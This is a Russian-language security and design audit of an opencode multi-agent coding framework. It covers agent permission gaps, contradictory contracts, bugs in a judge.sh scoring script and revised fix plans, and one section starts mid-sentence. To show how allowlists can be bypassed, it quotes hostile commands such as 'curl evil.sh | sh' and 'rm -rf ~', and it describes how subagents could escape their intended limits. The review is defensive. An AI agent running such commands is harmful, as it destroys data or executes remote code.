## 1. Безопасность и модель прав

### B-1 (Blocker). Вложенная делегация не запрещена структурно

`permission.task` объявлен **только** в `orchestrator.md`. У `planner`, `coder`, `tester`,
`reviewer` ключ `task` отсутствует, а в opencode «большинство прав по умолчанию `allow`».
Значит любой субагент может вызвать Task и породить вложенного субагента.

Это прямо опровергает два документа:

- `docs/design-decisions.md` §1: «Nested subagents (coder calls tester) — responsibility
  quickly blurs» подан как принятое архитектурное ограничение;
- §2: «**Structural** protection against spontaneous delegation».

Защита не структурная, а отсутствующая.

**Фикс:** в каждый из 4 субагентских контрактов добавить `task: { "*": "deny" }`.

### B-2 (Blocker). `external_directory` не объявлен — это и есть несработавший фикс v4

`docs/v4-to-v5.md` фиксирует провал v4: «Tester dispatch rejected by environment
(external_directory) — 3 min lost + retry», и заявляет фикс v5 «Artifacts inside repo
only → 0 retries». Но фикс сделан **только текстом контракта**. В opencode
`external_directory` по умолчанию `"ask"`, а в headless-режиме `opencode run` некому
ответить на «ask» → ровно тот же сценарий блокировки повторится.

**Фикс:** во все 5 контрактов — `external_directory: { "*": "deny" }`.
Это единственный ключ, где текстовой дисциплины принципиально недостаточно.

### B-3 (Blocker). Allow-паттерны в bash шире, чем выглядят

Документация opencode: `*` в паттерне прав — это «zero or more of any character»,
сопоставляемое со **всей строкой команды**. Следовательно:

| Файл | Паттерн | Что реально разрешено |
|---|---|---|
| `reviewer.md:14` | `"go test*"` | `go test ./... ; rm -rf ~` |
| `reviewer.md:16` | `"go build*"` | `go build -o /tmp/x && /tmp/x` |
| `planner.md:9` | `"cat *"` | `cat x; curl evil.sh \| sh` |
| `planner.md:11` | `"find *"` | `find . -delete` |

При этом `README.md:38` называет reviewer «read-only (git + go test)». Это неверно:
`go test` и `go build` исполняют произвольный код проекта и пишут в ФС, а разделители
команд обходят аллоулист.

**Фикс:** добавить после аллоу-правил слой явных deny (порядок важен — побеждает последнее
совпадение), по образцу самой документации opencode:

```yaml
bash:
  "*": "deny"
  "go test ./...": "allow"
  "go vet ./...": "allow"
  "git diff*": "allow"
  "*;*": "deny"
  "*&&*": "deny"
  "*|*": "deny"
  "*`*": "deny"
  "*$(*": "deny"
```

и в README заменить «read-only» на «no-write-tools; разрешён ограниченный набор
исполняющих команд».

### B-4 (Major). `coder` и `tester` имеют `bash: { "*": "allow" }`

То есть могут `git push`, `rm -rf`, `curl`. `design-decisions.md` §5 утверждает
«coder/tester **never** commit» — это тоже только текст. Минимум: добавить
`"git commit*": "deny"`, `"git push*": "deny"`, `"git reset*": "deny"`.

### B-5 (Major). `webfetch` / `websearch` нигде не ограничены

По умолчанию `allow` у всех пяти ролей. Для агента с полным bash это неконтролируемый
канал наружу. Как минимум `planner`/`reviewer` должны иметь `webfetch: deny`.

## 2. Логические противоречия

### L-1 (Blocker). `tester` обязан коммитить и обязан не коммитить

- `agents/tester.md:11-12` — «if a test task exceeds 5 minutes, **commit what you have**».
- `agents/coder.md:10` — «The team lead commits».
- `agents/orchestrator.md:69` — «Team lead commits».
- `docs/design-decisions.md:43` — «coder/tester **never** commit; only the team lead does».

Прямое противоречие внутри одного релиза, причём у tester есть техническая возможность
выполнить обе инструкции. Это нарушает и заявленную атомарность коммитов
(«Atomic commit = one task», `SPEC.md:104`).

**Фикс:** в `tester.md` заменить на «stop, return partial results and a `partial` note;
the team lead commits».

### L-2 (Blocker). «Language-agnostic» против жёсткой привязки к Go

`SPEC.md:23` — «team contracts are language-agnostic». Фактически:

| Место | Go-специфика |
|---|---|
| `tester.md:10` | `go test -race` — безусловное требование |
| `reviewer.md:14-16` | аллоулист `go test` / `go vet` / `go build` |
| `orchestrator.md:52` | «Extract **cmd/server** logic» — идиома Go |
| `coder.md:9` | «Extract **cmd/** logic» |
| `orchestrator.md:68` | «`-race` required» |

**Фикс (выбрать одно):**
- (a) честно объявить v5 как Go-профиль и убрать утверждение из SPEC; либо
- (b) вынести язык в переменные контракта: `TEST_CMD`, `RACE_FLAG`, `ENTRYPOINT_DIR`,
  а `install.sh` подставляет профиль (`--profile go|python|ts`). Рекомендую (b) —
  это же закрывает недоделанный флаг `--models` (см. I-3).

### L-3 (Major). Лимит длины контракта нарушен самим контрактом

`SPEC.md:88` — «Each contract <= 60 lines». `design-decisions.md:82` — «~60 lines (v5)…
that's the **deliberate ceiling**». Факт: `agents/orchestrator.md` — **75 строк**
(64 строки тела + 11 frontmatter).

**Фикс:** либо поднять лимит до 80 и обновить оба документа, либо вынести таблицу
Skill Mapping в `agents/skill-map.md` и ссылаться из контракта.

### L-4 (Major). Vendored-скилы никем не используются

`vendor/skills/` (10 файлов, 155 КБ, 75% репозитория) не копируется `install.sh`,
не читается ни одним контрактом и не упоминается в Quick Start. `SPEC.md:19` вместо
этого велит ставить скилы через `npx skills add addyosmani/agent-skills` — то есть
из сети, мимо запиненных хешей. Вендоринг не даёт заявленной воспроизводимости.

**Фикс:** `install.sh` должен копировать `vendor/skills/` в `.opencode/skills/`
(или `.claude/skills/`), а SPEC — указывать вендор как источник по умолчанию,
а `npx skills add` как запасной путь.

### L-5 (Major). Параллельная делегация reviewer ∥ tester логически неконсистентна

`orchestrator.md:46` — «dispatch reviewer and tester in one turn when independent»,
`v4-to-v5.md:41` обещает за это −8-10 мин. Но tester **пишет** тесты
(`edit: {"*": "allow"}`), а reviewer оценивает диф. Запущенные одновременно, они
работают по разным состояниям дерева: reviewer выносит вердикт по коду без тестов,
которые tester прямо сейчас добавляет. Экономия времени покупается невалидным ревью.

**Фикс:** параллелить можно только **действительно** read-only пары. Либо tester тоже
делается read-only и возвращает тесты текстом (как planner, §6 design-decisions), либо
правило сужается до «reviewer ∥ planner».

### L-6 (Minor). «Evidence-based [x]» и «не копировать stdout» в натяжении

`orchestrator.md:29` требует «adjacent command + result (exit code)», а строка 74
запрещает «copying full command stdout into artifacts». Граница «result» не определена —
именно размытость этого требования в v4 породила 28-минутный блок
(`timing-analysis.md:27-31`). Стоит задать формат жёстко:
`` `cmd` → exit N, <= 2 lines summary ``.

## 3. Фактические ошибки

### F-1 (Blocker, воспроизводимость). `judge.sh` не считает счёт и всегда возвращает 0

Весь корпус документации опирается на метрику «judge 15/15» (`README.md:17`,
`SPEC.md:120`, `v4-to-v5.md:54`). Скрипт `examples/judge.sh`:

- нигде не суммирует PASS/FAIL;
- `met` вызывается только в `fail()`, так что `metrics.env` содержит лишь провалы;
- финальная строка — `echo "JUDGE DONE: $FW"`, exit code всегда 0.

Значит «15/15» сейчас получается только ручным пересчётом отчёта. Как CI-гейт судья
непригоден — главный заявленный инструмент верификации не верифицирует.

**Фикс:** счётчики `PASS_N`/`FAIL_N`, строка `met SCORE "$PASS_N/15"`, `exit $((FAIL_N > 0))`.

### F-2 (Major). Покрытие считается неверно

`judge.sh:37`:
```bash
COV=$(... | grep -o 'coverage: [0-9.]*%' | tail -1 | ...)
```
`tail -1` берёт покрытие **последнего пакета в алфавитном порядке**, а не агрегат.
При этом документы оперируют «weighted coverage» (`v4-to-v5.md:8,52`) и
«coverage > 90%» (`SPEC.md:120`). Сравнение v1/v4/v5 по этой метрике некорректно.

**Фикс:** `go test -coverprofile=cover.out ./... && go tool cover -func=cover.out | tail -1`.

### F-3 (Major). B6 — флака, а не проверка инварианта

`judge.sh:66-69` шлёт 20 запросов через `xargs -P 10` и требует **ровно** 5 успехов
при `WINDOW_SECONDS=2`. Каждый `grpcurl` — отдельный процесс (~50-200 мс старта),
две волны по 10 легко выходят за окно в 2 с, и успехов станет 6-10. Проверка, призванная
подтвердить детерминизм, сама недетерминирована.

**Фикс:** поднять `WINDOW_SECONDS` для прогона судьи (через env сервера) или проверять
`5 <= SUCC <= 7` с логированием, либо заменить на in-process Go-тест.

### F-4 (Major). `judge.sh:80` — «huge-n» пишет `n=1`

```bash
echo "huge-n:"; incr bake-k5 1;
```
В B8 (строка 76) тот же ключ тестируется как `incr bake-k5 999999`. В `battery-notes.txt`
под меткой `huge-n` сохраняется результат обычного инкремента. Артефакт, который по
замыслу сверяют с `DECISIONS.md`, содержит не то, что подписано.

### F-5 (Minor). Вывод `ls` в SPEC не соответствует реальному

`SPEC.md:33` показывает `orchestrator.md planner.md coder.md tester.md reviewer.md`.
`ls` сортирует: `coder.md orchestrator.md planner.md reviewer.md tester.md`.

### F-6 (Minor). `cp "$MET" "$OUT/metrics.env"` — копирование файла в себя

`judge.sh:12` задаёт `MET="$OUT/metrics.env"`, строка 100 копирует его туда же.
На macOS это печатает `cp: ... are identical (not copied)` и возвращает 1. Мёртвый код + шум.

### F-7 (Minor). `pkill -f 'bin/server'` бьёт по всему хосту

`judge.sh:43` убивает любой процесс с подстрокой `bin/server`, включая чужие.
Нужен `pkill -f "$RUN/bin/server"` или pid-файл.

### Решение 1 — агностичность без новой механики

Исходный F2 (каталог `profiles/` + флаг `install.sh --profile`) был неверным
решением: он добавляет механику ради того, что opencode уже умеет. Проверенный
факт из документации: **«Agent permissions are merged with the global config,
and agent rules take precedence»**. Значит язык-зависимая часть выносится в
`opencode.json` целевого проекта — это нативный механизм opencode, а не код фреймворка.

Разделение:

| Что | Где живёт | Язык-зависимо |
|---|---|---|
| Роли, дисциплина, TDD-цикл, 5 осей ревью | `agents/*.md` | нет |
| Деструктивные deny (`*;*`, `git push*`, `external_directory`) | `agents/*.md` | нет |
| Аллоулист тест-команд (`go test`, `pytest`, `npm test`) | `opencode.json` проекта | да |
| Роутинг моделей | `opencode.json` проекта | нет, но вендор-зависимо |

Правки текста контрактов (нулевой прирост строк):

- `tester.md`: «tests with `-race`» → «concurrency tests using the project's race/
  thread-safety mode if the language has one (Go: `-race`, Python: `pytest-xdist`,
  Rust: `cargo test`)»
- `coder.md` / `orchestrator.md`: «Extract `cmd/` logic» → «Extract entrypoint logic
  into testable functions; the entrypoint stays ≤ 10 lines of glue»
- `reviewer.md`: убрать `go test*`/`go vet*`/`go build*` из frontmatter — проект
  добавляет свои в `opencode.json`

`install.sh` дополнительно кладёт стартовый `opencode.json.example` с Go-пресетом.
Стоимость: ~40 минут вместо 3 часов. Новых сущностей — ноль.

### Решение 2 — ревьюер после тестера, и честная цена

Новый порядок на задачу: `coder → tester → reviewer (2 оси) → commit оркестратором`.
Снимается расхождение, при котором ревьюер выносил вердикт по дереву, которое
тестер в этот момент менял.

**Цена решения нужна открыто.** `v4-to-v5.md:41` закладывал в цель «≤55 мин»
экономию −8-10 мин именно от этой параллели. Пересчёт от измеренных 80,8 мин v4:

| Фикс | Было в прогнозе | Остаётся |
|---|---:|---:|
| Таймбокс тест-задач | −20 | −20 |
| Параллель reviewer ∥ tester | −8 | **0** |
| Нет external_directory retry | −3 | −3 |
| Батчинг волн | −2 | −2 |
| **Итого** | **81 − 33 = 48** | **81 − 25 = 56** |

Цель «≤55 мин» (`SPEC.md:120`) становится недостижимой по собственной модели проекта.
Варианты: (а) поднять цель до ≤60 мин до первого измерения v5; (б) компенсировать
за счёт B2/B5. Рекомендую (а) — цель, выведенная из прогноза, не должна выдаваться
за обязательство, пока прогон не выполнен (см. E7).

### Решение 3 — что такое «генерация контрактов» и почему отклонена

Имелось в виду следующее. После трека A в каждом из 5 файлов появляется почти
одинаковый блок прав:

```yaml
task: { "*": "deny" }
external_directory: deny
webfetch: deny
```

F1 предлагал не дублировать его, а держать `agents/*.tpl.md` + `make agents`,
который собирает финальные файлы.

**Отклонено — три причины, и авторское ревью здесь право:**

1. Нарушает `design-decisions.md` §12: механизм должен быть «git-versioned,
   human-readable in a minute, **editable without rebuilding**». Сгенерированный
   файл редактировать нельзя — правка затрётся.
2. Ломает критерий успеха `SPEC.md:123` «Adding a role = editing one file»:
   стало бы два (шаблон + запуск `make`).
3. Экономия отрицательная: дублирование — 3 строки × 5 файлов = 15 строк против
   Makefile + шаблонов + шага сборки.

**Чем заменено:** дублируем блок явно, а инвариант «во всех субагентах есть
`task: deny` и `external_directory: deny`» проверяет CI (C1). Проверка в CI даёт
ту же гарантию, что кодогенерация, но не добавляет кода в продукт — это ровно
тезис авторского ревью «качество от дисциплины, а не от механики», применённый
к самому репозиторию.

### Решение 4 — перевод с сохранением baseline

`examples/TASK.md` переводится на английский. Русский оригинал сохраняется как
`examples/TASK.ru.md` с пометкой «original input of experiments v1-v4; do not edit».
Это снимает возражение о воспроизводимости: сравнение v1-v4 по-прежнему опирается
на тот же текст, а новые прогоны используют английскую версию.
`install.sh` и `examples/judge.sh` переводятся целиком — там русский текст
не является экспериментальными данными.

безопасным read-only параллелизм в v5 неисправен** — ревьюер читает дерево,
которое тестер мутирует. Если ломается заявленно-безопасный случай, риск
пишущего параллелизма выше «умеренного».

## Где авторское ревью опирается на неизмеренное

Центральный вывод ревью — «v5 — точка оптимума, дальше кривая загибается» —
держится на строке таблицы:

```
v5    75 строк    >93 %    ≤55 мин
```

Это **прогноз, а не измерение**. Источник — `docs/v4-to-v5.md:50`, раздел
буквально озаглавлен «**Projected** v5 Metrics». Прогон v5 не выполнялся:
в репозитории 2 коммита, нет ни логов, ни артефактов прогона, судья не способен
выдать счёт.

Ревью при этом само признаёт проблему в пункте #1: «v1–v4 — по одному прогону;
статистическая значимость низкая». Два утверждения несовместимы: нельзя
одновременно считать значимость низкой и объявлять v5 доказанным оптимумом.
Корректная формулировка — «v5 — **гипотеза** оптимума, подлежащая проверке»,
и тогда приоритет #1 авторского списка (больше прогонов) становится не
улучшением, а блокирующим условием. Это ровно то, что делает трек E.

Отдельно: точки v1–v4 на кривой «строк/оркестратор» (~20, ~25, ~30, ~40)
в репозитории не зафиксированы — в git всего две ревизии, обе v5. Проверить
кривую по исходникам нельзя.

## Где арифметика не сходится

Главный количественный аргумент ревью против любых добавлений:

> «каждая дополнительная строка контракта стоит ~5 k input (субагент её перечитывает)»

Измерено по репозиторию:

| Файл | Символов | ≈ токенов |
|---|---:|---:|
| orchestrator.md | 3 246 | ~811 |
| reviewer.md | 811 | ~202 |
| planner.md | 571 | ~142 |
| tester.md | 487 | ~121 |
| coder.md | 452 | ~113 |
| **Все 5 контрактов** | **5 567** | **~1 391** |

То есть ~10 токенов на строку, а весь корпус контрактов — **0,27 % от измеренного
прогона v4 (521 k input)**.

Проверка тезиса на прочность:

- Прямое прочтение: 139 строк × 5 k = **695 k input** — больше бюджета проекта
  (450 k, `SPEC.md:121`) и больше измеренного пика v4 (521 k). Весь прогон целиком
  не вмещает одни только контракты.
- Мягкое прочтение (строка оркестратора пересылается каждый ход): 10 токенов ×
  N ходов. Чтобы достичь 5 k, нужно ~500 ходов оркестратора при измеренных
  13 сессиях.
- «Субагент её перечитывает» неверно для строк оркестратора: субагент получает
  свой контракт, а не контракт родителя.

Оценка завышена примерно на порядок. **Что в тезисе верно:** направление.
Контракты не бесплатны, и бесконтрольный рост тела контракта действительно
размывает приоритеты — это зафиксировано в `design-decisions.md` §10 и я с этим
согласен. Неверна только величина, и именно величина использовалась как
аргумент против правок.

Вторая цифра — «~30 сек координации на строку» — **подтверждается**:
`timing-analysis.md:43-45` даёт +4,8 мин координации на ~15 строк прироста
v3→v4, то есть ~19 сек/строку. Но там же сказано, за счёт чего: «~2 min to
planning and ~3 min to **inter-delegation decisions**». Это стоимость строк,
которые **добавляют модели решение**. Декларация прав решений не добавляет —
она их отнимает.

## Главное методологическое расхождение

Ревью рассматривает все изменения в одной категории «добавления к паттерну».
Мой трек A в неё не попадает:

| | Тело контракта (проза) | Frontmatter (права) |
|---|---|---|
| Кто исполняет | модель, при каждом решении | харнесс opencode, при вызове инструмента |
| Эффект на внимание модели | размывает приоритеты | нет |
| Стоимость координации | ~19-30 сек/строка (измерено) | 0 — решений не добавляет |
| Что делает | расширяет пространство поведения | **сужает** его |

`design-decisions.md` §10 формулирует выигрышную комбинацию сам:
«short contracts **+ hard permissions** work better». Трек A — это и есть
«hard permissions». Он не противоречит тезису ревью, он является его реализацией.

Цена трека A в токенах: ~36 строк frontmatter ≈ ~360 токенов ≈ **+0,07 %
к прогону**. Против этого — закрытие трёх блокеров, один из которых (B-2,
`external_directory`) есть **регресс уже известного сбоя v4**, а не новая функция.

Чего ревью не касается вовсе: слова «права», «permission», «безопасность»
в нём отсутствуют. Ни один из 9 пунктов не рассматривает модель прав.
Трек A не отвергнут этим ревью — он находится вне его рамки.

## Где ревью право, а я ошибался — самокоррекция плана

| Пункт | Был | Стало | Причина |
|---|---|---|---|
| **D1** | Вынести Skill Mapping из `orchestrator.md` в отдельный файл, −5-8 % input | **Снят** | Обоснование опиралось на ту же завышенную стоимость строки, которую я опровергаю выше. Реальная экономия — ~80 токенов. При этом вынос требует tool-call на чтение (дороже) и возвращает ad-hoc вариативность выбора скиллов, ради устранения которой таблица и создавалась (`design-decisions.md` §13). Чистый вред |

Итог самокоррекции: −4 пункта, −1 переопределён, −1 инвертирован.
Заявленная экономия токенов снижается с «−25-30 %» до **−10-15 %**, и остаётся
она почти целиком за счёт D2 (запрет субагентам перечитывать `TASK.md`) —
